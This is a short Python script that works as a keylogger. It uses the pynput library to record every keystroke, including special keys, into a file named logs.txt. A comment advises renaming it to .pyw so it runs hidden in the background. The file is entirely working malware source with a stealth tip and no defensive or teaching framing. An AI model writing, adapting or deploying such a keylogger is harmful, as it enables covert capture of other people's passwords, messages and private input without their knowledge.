from pynput.keyboard import Listener, Key
# to run it in the background change .py to .pyw


def on_press(key):
    f = open("logs.txt", 'a')
    if hasattr(key, 'char'):
        f.write(key.char)
    elif key == Key.space:
        f.write(' ')
    elif key == Key.enter:
        f.write('\n')
    elif key == Key.tab:
        f.write('\t')
    else:
        f.write('[' + key.name + ']\n')
    f.close()


with Listener(on_press=on_press) as listener:
    listener.join()
